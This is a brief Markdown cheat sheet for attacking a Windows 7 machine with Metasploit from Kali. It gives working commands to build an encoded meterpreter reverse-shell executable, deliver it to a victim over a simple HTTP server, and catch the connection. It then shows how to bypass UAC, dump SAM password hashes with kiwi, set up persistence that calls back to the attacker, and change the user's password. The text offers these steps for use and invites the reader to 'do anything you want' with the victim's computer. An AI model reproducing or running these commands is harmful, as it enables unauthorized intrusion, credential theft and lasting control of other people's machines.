# Metasploit Basics using Kali #
OS Windows 7
- - - - 

#### 1. Create the .exe with Venom ####

    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.6 lport=4444 -e x86/shikata_ga_nai -f exe > /root/Desktop/socks.exe
    msfvenom -p windows/meterpreter/reverse_tcp lhost={Your IP} lport={Port number} -e x86/shikata_ga_nai -f exe > {File's path}

#### 2. On metasploit, select the payload ####

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
Configure the settings <code>show options</code> and <code>exploit</code>.

#### 3. It's necesary to execute the file on the victim's computer ####
Use <code>python -m SimpleHTTPServer 80</code> to have an easy acces to your file wihtout the need of download it.
Run your file through any browser on victim's computer using your IP and the connection should be established.

Then do anything you want with the computer's victim, remember alway use:
>   <code>show options</code> to configure the settings.  

>   <code>background</code> to set the current session on background.

>   <code>sessions</code> list all the active sessions.

>   <code>exploit</code> or <code>run</code> execute the exploit.

#### Get system credentials #### 
    use exploit/windows/local/bypassuac
#### Use Kiwi to get all the hashes ####
    load kiwi
    lsa_dump_sam
#### Make a permantent connection with the victim ####
    run persistence -U -i 5 -p 4444 -r 192.168.0.3
    run persistence -U -i {Intervale time} -p {port} -r {lhost IP}
#### Change user password ####
    use windows/manage/change_password
